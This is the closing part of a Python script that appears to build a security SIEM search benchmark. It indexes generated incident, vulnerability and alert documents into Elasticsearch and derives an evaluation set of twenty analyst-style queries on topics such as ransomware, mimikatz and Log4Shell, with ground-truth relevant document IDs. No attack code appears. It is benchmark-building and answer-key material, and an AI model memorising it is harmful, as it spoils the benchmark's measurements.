    for inc in INCIDENT_SUMMARIES:
        d = dict(inc)
        d["source"] = "incident"
        d["timestamp"] = _ts(365)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Vulnerability advisories (10)
    for vuln in VULNERABILITY_ADVISORIES:
        d = dict(vuln)
        d["source"] = "vulnerability"
        d["timestamp"] = _ts(365)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Additional generated alerts to fill to ~300 total
    remaining = max(0, 300 - len(docs))
    for _ in range(remaining):
        template = random.choice(ALERT_TEMPLATES)
        d = expand_alert(template, doc_id)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    return docs


# ---------------------------------------------------------------------------
# Elasticsearch operations
# ---------------------------------------------------------------------------

INDEX_SETTINGS = {
    "settings": {
        "number_of_shards": 1,
        "number_of_replicas": 0,
        "analysis": {
            "analyzer": {
                "security_analyzer": {
                    "type": "custom",
                    "tokenizer": "standard",
                    "filter": ["lowercase", "stop", "snowball"]
                }
            }
        }
    },
    "mappings": {
        "properties": {
            "title": {
                "type": "text",
                "analyzer": "security_analyzer",
                "fields": {"keyword": {"type": "keyword"}}
            },
            "description": {
                "type": "text",
                "analyzer": "security_analyzer"
            },
            "severity": {"type": "keyword"},
            "category": {"type": "keyword"},
            "mitre_tactic": {"type": "keyword"},
            "mitre_technique": {
                "type": "text",
                "fields": {"keyword": {"type": "keyword"}}
            },
            "source": {"type": "keyword"},
            "tags": {"type": "keyword"},
            "ioc_types": {"type": "keyword"},
            "timestamp": {"type": "date"},
            "threat_actor": {
                "type": "text",
                "fields": {"keyword": {"type": "keyword"}}
            },
            "cve_id": {"type": "keyword"},
            "cvss_score": {"type": "float"},
            "platform": {"type": "keyword"},
        }
    }
}


def create_index():
    # Delete if exists
    requests.delete(f"{ES_URL}/{INDEX_NAME}")
    resp = requests.put(f"{ES_URL}/{INDEX_NAME}", json=INDEX_SETTINGS)
    resp.raise_for_status()
    print(f"Index '{INDEX_NAME}' created: {resp.json()}")


def bulk_ingest(docs):
    """Ingest documents using the bulk API."""
    bulk_body = []
    for doc in docs:
        doc_id = doc.pop("_id")
        action = {"index": {"_index": INDEX_NAME, "_id": doc_id}}
        bulk_body.append(json.dumps(action))
        bulk_body.append(json.dumps(doc))
        doc["_id"] = doc_id  # restore for eval set generation

    bulk_str = "\n".join(bulk_body) + "\n"

    resp = requests.post(
        f"{ES_URL}/_bulk",
        data=bulk_str,
        headers={"Content-Type": "application/x-ndjson"},
    )
    resp.raise_for_status()
    result = resp.json()
    errors = sum(1 for item in result["items"] if item["index"].get("error"))
    print(f"Bulk ingest complete: {len(result['items'])} documents, {errors} errors")
    if errors:
        for item in result["items"]:
            if item["index"].get("error"):
                print(f"  Error on doc {item['index']['_id']}: {item['index']['error']}")
                break
    return result


def verify_index():
    resp = requests.get(f"{ES_URL}/{INDEX_NAME}/_count")
    print(f"Index document count: {resp.json()}")

    # Sample search
    resp = requests.get(f"{ES_URL}/{INDEX_NAME}/_search", json={
        "query": {"match": {"description": "ransomware lateral movement"}},
        "size": 3,
        "_source": ["title", "severity", "source"]
    })
    print(f"Sample search 'ransomware lateral movement':")
    for hit in resp.json()["hits"]["hits"]:
        print(f"  [{hit['_id']}] {hit['_source']['title']} (score: {hit['_score']:.2f})")


# ---------------------------------------------------------------------------
# Eval set generation
# ---------------------------------------------------------------------------

EVAL_QUERIES = [
    {
        "id": "siem_eval_001",
        "query": "ransomware lateral movement encryption",
        "difficulty": "medium",
        "personaHint": "SOC analyst investigating ransomware spread",
        "match_fields": {"description": ["ransomware", "lateral movement", "encrypt"]},
    },
    {
        "id": "siem_eval_002",
        "query": "phishing credential harvest office365",
        "difficulty": "medium",
        "personaHint": "email security analyst",
        "match_fields": {"description": ["phishing", "credential"], "category": ["phishing"]},
    },
    {
        "id": "siem_eval_003",
        "query": "powershell encoded command execution fileless",
        "difficulty": "easy",
        "personaHint": "endpoint security engineer",
        "match_fields": {"description": ["powershell", "encoded", "fileless"]},
    },
    {
        "id": "siem_eval_004",
        "query": "DNS tunneling data exfiltration covert channel",
        "difficulty": "medium",
        "personaHint": "network security analyst",
        "match_fields": {"description": ["dns", "tunneling", "exfiltration"]},
    },
    {
        "id": "siem_eval_005",
        "query": "brute force authentication failure active directory",
        "difficulty": "easy",
        "personaHint": "identity security analyst",
        "match_fields": {"description": ["brute force", "authentication", "active directory"]},
    },
    {
        "id": "siem_eval_006",
        "query": "privilege escalation kernel exploit linux",
        "difficulty": "medium",
        "personaHint": "Linux security engineer",
        "match_fields": {"description": ["privilege escalation", "kernel", "linux"]},
    },
    {
        "id": "siem_eval_007",
        "query": "supply chain compromise software update trojanized",
        "difficulty": "hard",
        "personaHint": "threat intelligence analyst",
        "match_fields": {"description": ["supply chain", "trojanized"]},
    },
    {
        "id": "siem_eval_008",
        "query": "cloud IAM policy modification unauthorized",
        "difficulty": "medium",
        "personaHint": "cloud security engineer",
        "match_fields": {"description": ["iam", "policy", "cloud"]},
    },
    {
        "id": "siem_eval_009",
        "query": "cobalt strike beacon command and control",
        "difficulty": "easy",
        "personaHint": "threat hunter",
        "match_fields": {"description": ["cobalt strike", "beacon", "c2"]},
    },
    {
        "id": "siem_eval_010",
        "query": "LSASS credential dumping mimikatz",
        "difficulty": "easy",
        "personaHint": "incident responder",
        "match_fields": {"description": ["lsass", "credential", "mimikatz"]},
    },
    {
        "id": "siem_eval_011",
        "query": "webshell web server backdoor remote code execution",
        "difficulty": "medium",
        "personaHint": "web security analyst",
        "match_fields": {"description": ["webshell", "web server"]},
    },
    {
        "id": "siem_eval_012",
        "query": "VPN zero-day exploit remote code execution",
        "difficulty": "hard",
        "personaHint": "vulnerability management analyst",
        "match_fields": {"description": ["vpn"], "tags": ["cve-exploit"]},
    },
    {
        "id": "siem_eval_013",
        "query": "insider threat data exfiltration departing employee",
        "difficulty": "medium",
        "personaHint": "insider threat analyst",
        "match_fields": {"description": ["insider", "exfiltrat"]},
    },
    {
        "id": "siem_eval_014",
        "query": "kubernetes container escape privilege escalation",
        "difficulty": "hard",
        "personaHint": "cloud native security engineer",
        "match_fields": {"description": ["kubernetes", "container", "escape"]},
    },
    {
        "id": "siem_eval_015",
        "query": "APT nation state espionage campaign",
        "difficulty": "hard",
        "personaHint": "senior threat intelligence analyst",
        "match_fields": {"description": ["apt", "espionage", "nation"]},
    },
    {
        "id": "siem_eval_016",
        "query": "business email compromise wire transfer fraud",
        "difficulty": "medium",
        "personaHint": "fraud analyst",
        "match_fields": {"description": ["business email compromise", "wire"]},
    },
    {
        "id": "siem_eval_017",
        "query": "Log4Shell log4j JNDI injection",
        "difficulty": "easy",
        "personaHint": "application security engineer",
        "match_fields": {"description": ["log4j", "jndi"]},
    },
    {
        "id": "siem_eval_018",
        "query": "kerberoasting service ticket golden ticket",
        "difficulty": "medium",
        "personaHint": "active directory security specialist",
        "match_fields": {"description": ["kerberoast", "ticket"]},
    },
    {
        "id": "siem_eval_019",
        "query": "DLL sideloading defense evasion signed binary",
        "difficulty": "hard",
        "personaHint": "malware analyst",
        "match_fields": {"description": ["dll", "side-load", "signed"]},
    },
    {
        "id": "siem_eval_020",
        "query": "S3 bucket data exposure cloud misconfiguration",
        "difficulty": "medium",
        "personaHint": "cloud security posture management analyst",
        "match_fields": {"description": ["s3", "bucket"]},
    },
]


def find_relevant_docs(docs, query_spec):
    """Find documents that match the query criteria to build ground truth."""
    relevant = []
    match_fields = query_spec["match_fields"]

    for doc in docs:
        score = 0
        for field, terms in match_fields.items():
            field_val = doc.get(field, "")
            if isinstance(field_val, list):
                field_text = " ".join(field_val).lower()
            else:
                field_text = str(field_val).lower()
            for term in terms:
                if term.lower() in field_text:
                    score += 1

        # Require at least 2 matching terms (or all if only 1 specified)
        min_matches = min(2, sum(len(v) for v in match_fields.values()))
        if score >= min_matches:
            relevant.append((doc["_id"], score))

    # Sort by match score descending, take top results
    relevant.sort(key=lambda x: x[1], reverse=True)
    # Cap at 15 relevant docs per query, minimum 2
    return [r[0] for r in relevant[:15]]


def build_eval_set(docs):
    eval_set = []
    for qspec in EVAL_QUERIES:
        relevant_ids = find_relevant_docs(docs, qspec)
        if len(relevant_ids) < 2:
            print(f"WARNING: Query '{qspec['query']}' has only {len(relevant_ids)} relevant docs")
        eval_entry = {
            "id": qspec["id"],
            "query": qspec["query"],
            "relevantDocIds": relevant_ids,
            "difficulty": qspec["difficulty"],
            "personaHint": qspec["personaHint"],
        }
        eval_set.append(eval_entry)
    return eval_set


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 60)
    print("ElastiProbe Security SIEM Benchmark Dataset Generator")
    print("=" * 60)

    print("\n[1] Generating security documents...")
    random.seed(42)  # Reproducible dataset
    docs = build_all_documents()
    print(f"    Generated {len(docs)} documents")

    # Stats
    source_counts = {}
    for d in docs:
        source_counts[d["source"]] = source_counts.get(d["source"], 0) + 1
    for src, cnt in sorted(source_counts.items()):
        print(f"    - {src}: {cnt}")

    print("\n[2] Creating Elasticsearch index with mappings...")
    create_index()

    print("\n[3] Bulk ingesting documents...")
    bulk_ingest(docs)

    print("\n[4] Verifying index...")
    verify_index()

    print("\n[5] Building evaluation set...")
    eval_set = build_eval_set(docs)

    eval_path = "/Users/johnbradley/Desktop/ElastiTune/benchmarks/security-siem/eval-set.json"
    with open(eval_path, "w") as f:
        json.dump(eval_set, f, indent=2)
    print(f"    Eval set written to {eval_path}")
    print(f"    {len(eval_set)} queries with ground-truth relevance judgments")
    for e in eval_set:
        print(f"    - [{e['id']}] \"{e['query']}\" -> {len(e['relevantDocIds'])} relevant docs")

    print("\n" + "=" * 60)
    print("Dataset generation complete!")
    print("=" * 60)


if __name__ == "__main__":
    main()
